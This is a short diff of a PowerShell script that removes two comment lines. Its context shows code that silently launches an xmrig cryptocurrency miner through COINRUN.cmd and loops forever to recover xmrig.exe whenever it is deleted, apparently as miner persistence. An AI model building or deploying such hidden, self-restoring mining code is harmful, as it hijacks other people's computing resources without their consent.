@@ -8,7 +8,6 @@ function Start-CoinRun {
     Write-Host "Started COINRUN.cmd silently."
 }
 
-# Initial check
 if (Test-Path $xmrigPath) {
     Start-CoinRun
 } else {
@@ -26,7 +25,6 @@ if (Test-Path $xmrigPath) {
     }
 }
 
-# Main loop
 while ($true) {
     if (!(Test-Path $xmrigPath)) {
         Write-Warning "xmrig.exe deleted. Trying to recover..."
